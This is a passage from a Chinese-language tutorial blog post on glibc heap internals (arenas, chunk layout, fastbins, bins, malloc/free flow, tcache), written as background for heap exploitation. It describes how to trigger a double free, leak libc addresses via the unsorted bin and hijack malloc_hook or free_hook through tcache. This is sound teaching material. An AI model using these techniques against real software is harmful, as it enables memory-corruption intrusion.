class="hljs-comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span><br>  <span class="hljs-type">int</span> have_fastchunks;<br><br>  <span class="hljs-comment">/* Fastbins */</span><br>  <span class="hljs-comment">//一个用来存放所有fastbin链表的数组,最多10个fastbin链表</span><br>  mfastbinptr fastbinsY[NFASTBINS];<br><br>  <span class="hljs-comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span><br>  mchunkptr top;<span class="hljs-comment">//指向top chunk</span><br><br>  <span class="hljs-comment">/* The remainder from the most recent split of a small request */</span><br>  mchunkptr last_remainder;<span class="hljs-comment">//指向last_remainder</span><br><br>  <span class="hljs-comment">/* Normal bins packed as described above */</span><br>  mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<span class="hljs-comment">//存放除fastbin的所有bin</span><br><br>  <span class="hljs-comment">/* Bitmap of bins */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> binmap[BINMAPSIZE];<br><br>  <span class="hljs-comment">/* Linked list */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span><span class="hljs-comment">//指向下一个arena</span><br><br>  <span class="hljs-comment">/* Linked list for free arenas.  Access to this field is serialized</span><br><span class="hljs-comment">     by free_list_lock in arena.c.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span><span class="hljs-comment">//指向下一个空闲的arena</span><br><br>  <span class="hljs-comment">/* Number of threads attached to this arena.  0 if the arena is on</span><br><span class="hljs-comment">     the free list.  Access to this field is serialized by</span><br><span class="hljs-comment">     free_list_lock in arena.c.  */</span><br>  INTERNAL_SIZE_T attached_threads;<span class="hljs-comment">//使用本arena的线程的数量</span><br><br>  <span class="hljs-comment">/* Memory allocated from the system in this arena.  */</span><br>  <span class="hljs-comment">//分配给本arena的内存范围</span><br>  INTERNAL_SIZE_T system_mem;<br>  INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="2-heap-info"><a href="#2-heap-info" class="headerlink" title="2._heap_info"></a>2._heap_info</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span></span><br><span class="hljs-class">&#123;</span><br>  mstate ar_ptr; <span class="hljs-comment">/* Arena for this heap. */</span>此堆段属于哪一个arena<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span> *<span class="hljs-title">prev</span>;</span> <span class="hljs-comment">/* Previous heap. */</span>指向前一个heap，非主线程的heap通过这个连接起来，串成单向链表<br>  <span class="hljs-type">size_t</span> size;   <span class="hljs-comment">/* Current size in bytes. */</span><br>  <span class="hljs-type">size_t</span> mprotect_size; <span class="hljs-comment">/* Size in bytes that has been mprotected</span><br><span class="hljs-comment">                           PROT_READ|PROT_WRITE.  */</span><br>  <span class="hljs-comment">/* Make sure the following data is properly aligned, particularly</span><br><span class="hljs-comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span><br><span class="hljs-comment">     MALLOC_ALIGNMENT. */</span><br>  <span class="hljs-type">char</span> pad[<span class="hljs-number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];<br>&#125; heap_info;<br></code></pre></td></tr></table></figure><p>main_arena没有_heap_info，其存在于thread_arena的每个heap的低地址开头，用于解释说明该heap。</p><h2 id="3-chunk和malloc-chunk"><a href="#3-chunk和malloc-chunk" class="headerlink" title="3.chunk和malloc_chunk"></a>3.chunk和malloc_chunk</h2><p>在程序的执行过程中，我们称由 malloc 申请的内存为 chunk 。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示。当程序申请的 chunk 被 free 后，会被加入到相应的空闲管理列表中。</p><p><strong>无论一个 chunk 的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构</strong>。虽然它们使用了同一个数据结构，但是根据是否被释放，它们的表现形式会有所不同。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  This struct declaration is misleading (but accurate and necessary).</span><br><span class="hljs-comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span><br><span class="hljs-comment">  fields at known offsets from a given base. See explanation below.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br><br>  INTERNAL_SIZE_T      prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br><br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/image-20230215163401495.png" alt="image-20230215163401495"></p><p>在内存中，prev_size在低地址，bk_nextsize在高地址</p><p>一般来说，size_t 在 64 位中是 64 位无符号整数，32 位中是 32 位无符号整数。</p><p>每个字段的具体的解释如下</p><ul><li><strong>prev_size</strong>, 如果该 chunk 的<strong>物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）</strong>是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。<strong>这里的前一 chunk 指的是较低地址的 chunk</strong> 。</li><li>size，该 chunk 的大小(包括了chunk_header,即prev_size和size)，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示<ul><li>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li><li>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</li><li>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</li></ul></li><li>fd，bk。chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下<ul><li>fd 指向下一个（非物理相邻）空闲的 chunk</li><li>bk 指向上一个（非物理相邻）空闲的 chunk</li><li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li><li>fd和bk指向的是prev_size位，是chunk_header,不是usr_data,所以p-&gt;fd-&gt;fd 即 p-&gt;fd - 0x18指向的地址单元内的数据(x64 )</li><li>但是，malloc函数返回的指针是指向usr_data的指针，free的也是这个指针</li></ul></li><li>fd_nextsize， bk_nextsize，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。<ul><li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li><li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li><li>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。<strong>这样做可以避免在寻找合适 chunk 时挨个遍历。</strong></li></ul></li></ul><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/image-20230215160404418.png" alt="image-20230215160404418"></p><p>如果一个 chunk 处于 free 状态，那么会有两个位置记录其相应的大小</p><ol><li>本身的 size 字段会记录，</li><li>它后面的 chunk 会记录。</li></ol><p><strong>一般情况下</strong>，物理相邻的两个空闲 chunk 会被合并为一个 chunk 。堆管理器会通过 prev_size 字段以及 size 字段合并两个物理相邻的空闲 chunk 块。同时，如果被free的chunk上方是top chunk,则该chunk会和top chunk合并。</p><h2 id="4-fastbinsY"><a href="#4-fastbinsY" class="headerlink" title="4.fastbinsY"></a>4.fastbinsY</h2><p>fastbin有10个数组(bin)，每个数组存放一个单向链表，每个链表存放同一个size的chunk，在进行添加删除操作时使用的是LIFO原则</p><p>题外话：为什么使用LIFO？为什么不直接插在链表尾？因为glibc有的只是fastbins[n]这一个指针和被free的chunk的地址，如果要插到链表尾，则需要沿着链表头一直迭代到链表尾，耗时更长</p><p>fastbin是为了减少小内存的切割和合并，提高效率而存在的。<strong>fastbin 范围的 chunk 的 inuse 始终被置为 1。因此它们不会和其它被释放的 chunk 合并。</strong>但是当释放的 chunk 与该 chunk 相邻的空闲 chunk 合并后的大小大于 FASTBIN_CONSOLIDATION_THRESHOLD 时，内存碎片可能比较多了，我们就需要把 fast bins 中的 chunk 都进行合并，以减少内存碎片对系统的影响。malloc_consolidate 函数可以将 fastbin 中所有能和其它 chunk 合并的 chunk 合并在一起。</p><p>默认情况下，对于size_t为4B的平台， 小于64B的chunk分配请求（最大可以80B，默认56B，即<strong>默认用8个bin</strong>）；对于size_t为8B的平台，小于128B的chunk分配请求(最大可以160B，默认112B)，程序会根据所需的size(<strong>这里指的是数据空间的大小，即去除prev_size和size字段后的大小</strong>)首先到fastbin中去寻找对应大小的bin中是否包含未被使用的chunk，如果有，则直接从bin中返回该chunk。而释放chunk时，也会根据chunk的size参数计算fastbin中对应的index，如果存在对应的大小，就将chunk直接插入对应的bin中。</p><p>tips：<em>32位平台 size_t 长度为 4 字节，64 位平台的 size_t 长度可能是 4 字节，也可能是 8 字节，64 位Linux平台 size_t 长度为 8 字节</em></p><p>32位下，各个fastbin存储的大小为:8,16,24,32,40,48,56,64,72,80</p><p>64位下，各个fastbin存储的大小为:16,32,48,64,80,96,112,128,144,160</p><p>例子：</p><p>在bin中插入chunk时，首先将要插入的chunk的fd修改为此时bin数组中存放的指针值，再将bin数组指向要插入的chunk，我们将bin数组指向的chunk称为链表头，每次插入chunk都插入到链表头，取出chunk也是先从链表头取</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">buff0</span> <span class="hljs-operator">=</span> malloc（malloc_size)<br><span class="hljs-attribute">buff1</span> <span class="hljs-operator">=</span> malloc（malloc_size)<br><span class="hljs-attribute">buff2</span> <span class="hljs-operator">=</span> malloc（malloc_size)<br>free（buff0）<br>free（buff1）<br>free（buff2）<br></code></pre></td></tr></table></figure><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/8854824-a442c2d04218da5f.webp" alt="8854824-a442c2d04218da5f"></p><p>1.malloc申请fastbin范围内的chunk时，会首先在fastbins中查询对应size的链表头是否为空，若不为空，则继续<strong>检查链表头指向的chunk的size位</strong>，没问题则返回给用户。在利用double free时需要特别注意这一点，最后申请到的目标地址并不是任意的，而是需要一个伪造的chunk。顺带一提，fd指向的是chunk_header的首地址，不是usr_data的首地址。</p><p>2.由于fastbin的机制，在满足fastbin的chunk在被释放后它下一个chunk的P位不会被置为0，也就是说即使当前chunk被释放掉了，但是他的next_chunk的P为还依然为1，导致了chunk能被多次释放，这样做是为了防止chunk被合并，提高效率，但成为了造成double free漏洞的因素之一。</p><p>3.对于fastbin中的chunk，在释放时只会对链表头的chunk进行检验</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Another simple check: make sure the top of the bin is not the</span><br><span class="hljs-comment">       record we are going to add (i.e., double free).  */</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>))<br>      &#123;<br>        errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>&#125;<br></code></pre></td></tr></table></figure><p>如上，释放chunk时会检测该chunk是否是链表头指向的chunk，是则报错</p><p>但是我们可以先free(chunk1)，再free(chunk2),再free(chunk1),这样chunk1就被free了两次，造成了double free漏洞</p><p>针对fastbin的攻击有：</p><ul><li>Fastbin Double Free</li><li>House of Spirit</li><li>Alloc to Stack</li><li>Arbitrary Alloc</li></ul><h2 id="5-bins"><a href="#5-bins" class="headerlink" title="5.bins"></a>5.bins</h2><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/image-20230215210936982.png" alt="image-20230215210936982"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<span class="hljs-comment">//NBINS = 128，即bins[254]</span><br></code></pre></td></tr></table></figure><ul><li><p>用于存储 unstored bin，small bins 和 large bins 的 chunk 链表。</p></li><li><p>malloc_state结构体的成员，每两个bins控制一个双向循环链表，第一个bins为fd，指向链表的头结点，第二个bins为bk，指向链表的尾结点，为了方便起见在这里称两个bins为一个BINS，这里一共有127个BINS。</p></li></ul><p><strong>对于bins中的双向链表，当BIN中只有一个chunk时，fd和bk指针都指向链表头，即一个libc的地址，可以用来泄露libc地址。并且由于chunk在大于fast bin时优先进入unsorted bin，进入small bin和large bin的条件较为苛刻，一般是用unsorted bin，其链表头地址为main_arena+88。比较典型的利用可以参考buu babyheap_0ctf_2017</strong></p><h3 id="1-unsorted-bin"><a href="#1-unsorted-bin" class="headerlink" title="1.unsorted bin"></a>1.unsorted bin</h3><h3 id="BINS-0-（即bins-0-bins-1-）为unsorted-bin，占一个BINS"><a href="#BINS-0-（即bins-0-bins-1-）为unsorted-bin，占一个BINS" class="headerlink" title="BINS[0]（即bins[0],bins[1]）为unsorted bin，占一个BINS"></a>BINS[0]（即bins[0],bins[1]）为unsorted bin，占一个BINS</h3><p><strong>FIFO</strong>，从头部插入，从尾部取出</p><p>&amp;bins[0]  &#x3D; main_arena + 104        &amp;bins[1] &#x3D; main_arena + 112</p><p>无chunk时，bins[0] &#x3D; bins[1] &#x3D; main_arena + 88  </p><p>只有一个chunk时，bins[0]和bins[1]都指向该chunk，该chunk的fd和bk都指向main_arena+88,该地址处存放top_chunk的地址</p><p>有多个chunk时，尾部的chunk的fd指向main_arena + 0x88</p><p>题外话：如果把bins[0]看作一个chunk的fd，bins[1]看作bk，那么main_arena+88就是这个chunk的prev_size</p><h3 id="2-small-bin"><a href="#2-small-bin" class="headerlink" title="2.small bin"></a>2.small bin</h3><h3 id="BINS-2-BINS-63-（即bins-2-bins-125-）为small-bins，占62个BINS"><a href="#BINS-2-BINS-63-（即bins-2-bins-125-）为small-bins，占62个BINS" class="headerlink" title="BINS[2]-BINS[63]（即bins[2]-bins[125]）为small bins，占62个BINS"></a>BINS[2]-BINS[63]（即bins[2]-bins[125]）为small bins，占62个BINS</h3><p>​链表中chunk的大小与index的关系是<em><em>2</em> size_t</em> index**</p><p>​采用<strong>FIFO(先入先出)算法</strong>：内存释放操作就将新释放的chunk添加到链表的front end(前端)，分配操作就从链表的   rear end(尾端)中获取chunk。</p><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/201907300808254.png" alt="201907300808254"></p><h3 id="3-large-bin"><a href="#3-large-bin" class="headerlink" title="3.large bin"></a>3.large bin</h3><h3 id="BINS-64-BINS-126-（即bins-126-bins-251-）为large-bins，占63个BINS"><a href="#BINS-64-BINS-126-（即bins-126-bins-251-）为large-bins，占63个BINS" class="headerlink" title="BINS[64]-BINS[126]（即bins[126]-bins[251]）为large bins，占63个BINS"></a>BINS[64]-BINS[126]（即bins[126]-bins[251]）为large bins，占63个BINS</h3><p>​大于等于1024字节（0x400）的chunk称之为large chunk</p><ul><li><p>large bin链表的个数为63个，被分为6组。</p></li><li><p>largechunk使用fd_nextsize、bk_nextsize连接起来。</p></li><li><p>同一个largebin中每个chunk的大小可以不一样，这些chunk根据一定的范围存储在一个larbin链表中。</p></li><li><p>large chunk可以添加、删除在large bin的任何一个位置。</p></li><li><p>在这63个largebins中：第一组的32个largebin链依次以64字节步长为间隔，即第一个largebin链中chunksize为1024-1087字节，第二个large bin中chunk size为1088~1151字节。第二组的16个largebin链依次以512字节步长为间隔；第三组的8个largebin链以步长4096为间隔；第四组的4个largebin链以32768字节为间隔；第五组的2个largebin链以262144字节为间隔；最后一组的largebin链中的chunk大小无限制。</p></li><li><p>在同一个largebin中：每个chunk的大小不一定相同，因此为了加快内存分配和释放的速度，就将同一个largebin中的所有chunk按照chunksize进行从大到小的排列：最大的chunk放在一个链表的front end，最小的chunk放在rear end；相同大小的chunk按照最近使用顺序排序。</p></li></ul><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/20190730154304263.png" alt="20190730154304263"></p><h2 id="6-堆内存释放"><a href="#6-堆内存释放" class="headerlink" title="6.堆内存释放"></a>6.堆内存释放</h2><p>主要流程在_int_free</p><p><a href="https://www.52pojie.cn/thread-1581911-1-1.html">glibcmalloc和free源码解析</a></p><p>（1）根据可用地址获取该地址所在的内存块</p><p> (1.5)各种check，如传入的指向chunk的指针是否16字节对齐(32位下8字节)，size位不能小于MINSIZE，下一个chunk的prev_inuse需要为1</p><p>（2）检查该内存块的大小是否属于 fast chunk范围，若是，则直接放入fast bin；否则（3）<br>（3）检查该内存块标志位M，若为1，则直接使用munmap释放；否则（4）<br>（4）检查相邻的上一个内存块（低地址）是否空闲，若空闲，则合并；<br>（5）检查相邻的下一个内存块是否空闲，若非空闲，则直接加入unsorted bin；若空闲，检查该内存块是否为top chunk，若为top chunk，则合并并修改top chunk的地址和大小；若非top chunk，则合并并添加到unsorted bin<br>（6）对于主Arena，检查top chunk的区域是否超过设定的阈值，若超过，那么就适当地缩减一部分，通过brk将一部分内存还给内核；对于子Arena，则会检查，目前top chunk所在堆的内存是否已经全部释放，若已将全部释放，那就通过munmap将这片内存还给内核。</p><p>可以看出，free内存块一共有4个去向：①放入fast bins ②放入unsorted bin ③合并入top chunk ④直接通过unmap还给内核</p><p>注：主Arena在进行堆的缩减时，首先通过sbrk(0)获取当前的brk的边界，如果brk &#x3D; top起始地址 + top的大小 才会进行缩减，这说明，当top chunk存在于mmap得到的堆时，brk还停留在非mmap得到的堆顶，这就是arena部分所说的这部分内存将永远无法返还给内核的原因。</p><p>堆合并一般思路： </p><p>1.尝试向低地址合并。</p><p>2.尝试向高地址合并，若为topchunk则直接并入topchunk，否则尝试合并后放入unsorted bin</p><h2 id="7-堆内存分配"><a href="#7-堆内存分配" class="headerlink" title="7.堆内存分配"></a>7.堆内存分配</h2><p>主要流程在_int_malloc</p><p><a href="https://www.52pojie.cn/thread-1581911-1-1.html">glibcmalloc和free源码解析</a></p><p><strong>请求的字节数和实际分配的内存大小原则</strong>：</p><p>1.不管是32位还是64位，malloc申请的内存(usr_data+chunk头)都是16字节对齐的</p><p>2.会对下一个chunk的prev_size位进行复用，比如32位下malloc(0x2c),按理来说0x2c+8位chunk头 &gt; 0x30，则chunk_size为0x41，但是由于复用了，chunk_size还是0x31，而malloc(0x2d)，chunk_size就是0x41了</p><p>  所以32位下，glibc2.31（ubuntu1804默认）、2.27,chunk_size &#x3D; malloc_size + 8 - 4     16位向上对齐（即不足16位按16位算）</p><p>  32位下对于   glibc2.23（ubuntu1604默认），chunk_size &#x3D; malloc_size + 8 - 4             8位向上对齐</p><p>  64位下chunk_size &#x3D; malloc_size + 0x10 - 8      16位向上对齐</p><p>  glib中堆内存分配的基本思路就是，首先找到本线程的Arena，然后优先在Arena对应的回收箱中寻找合适大小的内存，在内存箱中所有内存块均小于所需求的大小，那么就会去top chunk分割，但是如果top chunk的大小也不足够，此时不一定要拓展top，检查所需的内存是否大于128k，若大于，则直接使用系统调用mmap分配内存，如果小于，就进行top chunk的拓展，即堆的拓展，拓展完成后，从top chunk中分配内存，剩余部分成为新的top chunk。</p><pre><code class="hljs">1. 检查是否设置了`malloc_hook`，若设置了则跳转进入`malloc_hook`，若未设置则获取当前的分配区，进入`int_malloc`函数。2. 如果当前的分配区为空，则调用`sysmalloc`分配空间，返回指向新`chunk`的指针，否则进入下一步。3. 若用户申请的大小在`fast bin`的范围内，则考虑寻找对应`size`的`fast bin chunk`，判断该`size`的`fast bin`是否为空，不为空则取出第一个`chunk`返回，否则进入下一步。4. 如果用户申请的大小符合`small bin`的范围，则在相应大小的链表中寻找`chunk`，若`small bin`未初始化，则调用`malloc_consolidate`初始化分配器，然后继续下面的步骤，否则寻找对应的`small bin`的链表，如果该`size` 的`small bin`不为空则取出返回，否则继续下面的步骤。如果申请的不在`small bin`的范围那么调用`malloc_consolidate`去合并所有`fast bin`并继续下面的步骤。5. 用户申请的大小符合`large bin`或`small bin`链表为空，开始处理`unsorted bin`链表中的`chunk`。在`unsorted bin`链表中查找符合大小的`chunk`，若用户申请的大小为`small bin`，`unsorted bin`中只有一块chunk并指向`last_remainder`，且`chunk size`的大小大于`size+MINSIZE`，则对当前的`chunk`进行分割，更新分配器中的`last_remainder`，切出的`chunk`返回给用户，剩余的`chunk`回`unsorted bin`。否则进入下一步。6. 将当前的`unsorted bin`中的`chunk`取下，若其`size`恰好为用户申请的`size`，则将`chunk`返回给用户。否则进入下一步7. 获取当前`chunk size`所对应的bins数组中的头指针。（`large bin`需要保证从大到小的顺序，因此需要遍历）将其插入到对应的链表中。如果处理的chunk的数量大于`MAX_ITERS`则不在处理。进入下一步。8. 如果用户申请的空间的大小符合`large bin`的范围或者对应的small bin链表为空且`unsorted bin`链表中没有符合大小的`chunk`，则在对应的`large bin`链表中查找符合条件的`chunk`（即其大小要大于用户申请的`size`）。若找到相应的`chunk`则对`chunk`进行拆分，返回符合要求的`chunk`（无法拆分时整块返回）。否则进入下一步。9. 根据`binmap`找到表示更大`size`的`large bin`链表，若其中存在空闲的`chunk`，则将`chunk`拆分之后返回符合要求的部分，并更新`last_remainder`。否则进入下一步。10. 若`top_chunk`的大小大于用户申请的空间的大小，则将`top_chunk`拆分，返回符合用户要求的`chunk`，并更新`last_remainder`，否则进入下一步。11. 若`fast bin`不为空，则调用`malloc_consolidate`合并`fast bin`，重新回到第四步再次从`small bin`搜索。否则进入下一步。12. 调用`sysmalloc`分配空间，`free top chunk`返回指向新`chunk`的指针。13. 若`_int_malloc`函数返回的`chunk`指针为空，且当前分配区指针不为空，则再次尝试`_int_malloc`14. 对`chunk`指针进行检查，主要检查`chunk`是否为`mmap`，且位于当前的分配区内。</code></pre><p>  注：<br>  ①small request是指实际分配的内存块大小属于small chunk范围<br>  ②fast bins合并操作是指，检查fast bins中的所有内存块是否可以和相邻内存块合并，若可以合并，则进行合并，并将合并后的内存块加入到unsorted bin中<br>  ③last remainder是一个目的为更好的利用空间局部性的优化！<br>  ④MINSIZE是指一个内存块的最小大小，即 chunk头的前两个字段所占空间<br>  ⑤遍历unsorted bin 是，并不是找到一个大于当前所需的内存块就返回，是因为遵循“small first，best fit”原则，因为可能存在内存更小，内存块用于分配<br>  ⑥找到合适的内存块后，会将内存块从当前链表中移除<br>  ⑦large chunk是否可以分割取决于剩余的大小是否大于MINSIZE<br>  ⑧binmap是一个用于记录bins中各个bin是否存在有内存块的位图，需要注意，位图中若为空，则表示一定不存在；若非空，则可能存在；<br>  ⑨注意到，内存块的分配是按照对齐来的，并且内存块的分割若不成功，则会返回整个内存块，也就是说，我们得到的内存大小实际上可能大于我们所需要的内存大小的。<br>  ⑩直接使用mmap申请的内存会被标记为M，释放时，也会直接走munp释放给内核</p><h2 id="8-tcache-bin"><a href="#8-tcache-bin" class="headerlink" title="8.tcache bin"></a>8.tcache bin</h2><p>全称thread local caching，glibc 2.26开始引入 ，目的是提高效率，但是牺牲了安全性</p><ul><li><p>单链表，LIFO，后进先出，即存取都在链表头，链表指针为fd字段</p></li><li><p>和fastbin一样，不会被合并，inuse位不会置0</p></li><li><p>tcachebin中的链表指针指向的下一个chunk的<code>fd</code>字段，fastbin中的链表指针指向的是下一个chunk的<code>prev_size</code>字段</p></li><li><p>tcache_perthread_struct结构体中的tcache_entry *entries[TCACHE_MAX_BINS];声明了有64个元素的指针数组，即有64个tcache单链表，每相邻两个链表中的chunk大小相差0x10，所以用户数据部分范围(不考虑复用)是0x10-0x400，chunk_size最大0x410，malloc(&lt;&#x3D;0x408)的chunk都在tcache范围内。32位机器上是以8字节递增，即用户数据范围0x8-0x19c,chunk_size最大0x204，malloc(&lt;&#x3D;0x200)的chunk都在范围内。</p></li><li><p>每个单链表中最多存7个chunk</p></li><li><p>在<code>_int_free</code>中，最开始就先检查chunk的size是否落在了tcache的范围内，且对应的tcache未满，将其放入tcache中。</p></li><li><p>在内存申请的开始部分，调用malloc_hook之后，int_malloc之前，首先会判断申请大小块，在 tcache 是否存在，如果存在就直接从 tcache 中摘取，否则再使用_int_malloc 分配。注：这里没有对size是否符合bin对应的size的验证，可以直接劫持free_hook、malloc_hook、got表等</p><p>在<code>_int_malloc</code>中，</p><p>如果从fastbin中取出了一个块，那么会把该fastbin中剩余的块放入tcache中直至填满tcache（smallbin中也是一样）</p><p>如果进入了unsortedbin，且chunk的size和当前申请的大小精确匹配，那么在tcache未满的情况下会先将其放入到tcachebin中，继续在unsorted bin中遍历，遍历完若tcachebin中有对应大小的chunk，从tcache中取出（最后一个遍历到的chunk），如果在这个遍历的过程中，放入tcache的chunk达到tcache_unsorted_limit，则会直接返回当前遍历到的unsorted chunk。</p></li><li><p>binning code（chunk合并等其他情况）中，每一个符合要求的 chunk 都会优先被放入 tcache，而不是直接返回（除非tcache被装满）。如：合并完后的大chunk也会被先放进tcache</p></li><li><p><code>tcache_perthread_struct</code>本身也是一个堆块，大小为<code>0x250</code>，位于堆开头的位置，包含数组<code>counts</code>存放每个<code>bin</code>中的<code>chunk</code>当前数量，以及数组<code>entries</code>存放<code>64</code>个<code>bin</code>的首地址（可以通过<strong>劫持此堆块</strong>进行攻击）。</p></li><li><p>calloc()可越过tcache取chunk</p></li><li><p>可将<code>tcache_count</code>整型溢出为<code>0xff</code>以绕过<code>tcache</code>，直接放入<code>unsorted bin</code>等，但在<code>libc-2.28</code>中，检测了<code>counts</code>溢出变成负数（<code>0x00-1=0xff</code>）的情况，且增加了对<code>double free</code>的检查。</p></li></ul><p>1.<strong>glibc2.26</strong>开始引入(ubuntu17.10) ，但从glibc2.27开始引入了许多针对tcache的保护</p><p>2.27新增：</p><ul><li><code>CVE-2017-17426</code>是<code>libc-2.26</code>存在的漏洞，<code>libc-2.27</code>已经修复</li></ul><p>2.28新增：</p><ul><li>检测了<code>tcache_count</code>溢出变成负数（<code>0x00-1=0xff</code>）的情况</li><li>增加了对<code>double free</code>的检查</li></ul><p>2.29新增：</p><ul><li>在<code>tcache_put</code>和<code>tcache_get</code>中增加了对<code>key</code>的检查，chunk放入tcache后在chunk的开头加了key标识，通过检查key来判断chunk是否已经在tcache中存在，以此检查是否存在<code>double free</code></li></ul><p>2.32新增：</p><ul><li>引入safe_unlink机制，<code>tcache</code>和<code>fastbin</code>的<code>fd</code>指针<code>异或加密</code></li></ul><p>源码(glibc2.26)：</p><p>malloc和free的函数中以及其它也有和tcache相关的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 